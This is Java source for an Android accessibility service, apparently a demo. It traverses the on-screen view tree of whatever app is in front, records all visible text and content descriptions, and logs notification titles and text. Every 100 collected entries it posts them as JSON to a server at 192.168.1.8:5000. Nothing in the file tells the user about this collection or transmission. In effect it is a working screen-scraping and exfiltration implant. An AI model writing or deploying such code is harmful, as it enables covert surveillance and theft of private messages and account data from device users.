package com.example.demo;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "MyAccessibilityService";
    private static final int BATCH_SIZE = 100;
    private final Set<String> loggedNodes = new HashSet<>();
    private final Set<String> tmpNodes = new HashSet<>();
    private final Set<String> loggedPackages = new HashSet<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();

        try {
            handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage(), e);
        }

        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            handleNotificationStateChanged(event);
        }
    }

    private void handleNodeInfo(AccessibilityNodeInfo node, int depth, String packageName) {
        if (node == null) {
            return;
        }

        if (loggedPackages.add(packageName)) {
            Log.d(TAG, "\n" + packageName);
        }

        StringBuilder indentation = new StringBuilder();
        for (int j = 0; j < depth; j++) {
            indentation.append("  ");
        }

        CharSequence nodeText = node.getText();
        CharSequence nodeContentDescription = node.getContentDescription();
        String className = getClassSimpleName(node.getClassName().toString());

        if (nodeText != null && nodeText.equals(nodeContentDescription)) {
            nodeContentDescription = null;
        }

        String sb = indentation + className + " " +
                (nodeText != null ? nodeText : "") + " " +
                (nodeContentDescription != null ? nodeContentDescription : "");

        if (loggedNodes.add(sb)) {
            Log.d(TAG, sb);
            tmpNodes.add("\n"+packageName);
            tmpNodes.add(sb);

            if(tmpNodes.size() == BATCH_SIZE){
                sendDatatoServer(new HashSet<>(tmpNodes));
                tmpNodes.clear();
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            handleNodeInfo(node.getChild(i), depth + 1, packageName);
        }
    }

    private String getClassSimpleName(String className) {
        int lastDotIndex = className.lastIndexOf('.');
        return lastDotIndex != -1 ? className.substring(lastDotIndex + 1) : className;
    }

    private void sendDatatoServer(Set<String> data) {
        new Thread(() -> {
            HttpURLConnection urlConnection = null;
            try {
                URL url = new URL("http://192.168.1.8:5000");
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setDoOutput(true);
                urlConnection.setRequestProperty("Content-Type", "application/json");

                JSONArray jsonArray = new JSONArray(data);

                try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
                    writer.write(jsonArray.toString());
                    writer.flush();
                }

                int responseCode = urlConnection.getResponseCode();
                Log.d(TAG, "Response Code: " + responseCode);

            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage(), e);
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }
        }).start();
    }

    private void handleNotificationStateChanged(AccessibilityEvent event) {
        Parcelable parcelable = event.getParcelableData();
        if (parcelable instanceof Notification) {
            Notification notification = (Notification) parcelable;
            CharSequence notificationTitle = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence notificationText = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
            Log.d(TAG, "Package Name: " + event.getPackageName());
            Log.d(TAG, "Notification Title: " + notificationTitle);
            Log.d(TAG, "Notification Text: " + notificationText);
        } else {
            List<CharSequence> notificationText = event.getText();
            if (!notificationText.isEmpty()) {
                for (CharSequence t : notificationText) {
                    Log.d(TAG, "Notification Text: " + t);
                }
            } else {
                Log.d(TAG, "Notification state changed but no text available.");
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Service connected");
    }
}
